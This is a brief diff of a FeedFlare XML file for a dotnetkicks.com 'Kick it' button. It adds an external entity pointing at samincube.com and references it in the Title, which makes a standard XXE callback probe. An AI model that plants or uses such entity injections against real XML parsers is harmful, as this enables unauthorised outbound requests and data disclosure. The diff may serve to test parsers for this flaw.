@@ -1,8 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE FeedFlareUnit SYSTEM "http://samincube.com/c.php?x=777">
+<!DOCTYPE FeedFlareUnit [
+<!ENTITY foo SYSTEM "http://samincube.com/c.php?x=777">
+]>
 <FeedFlareUnit>
   <Catalog>
-    <Title>Kick it</Title>
+    <Title>Kick &foo; it</Title>
     <Description>Kick this story on dotnetkicks.com</Description>
   </Catalog>
   <FeedFlare>
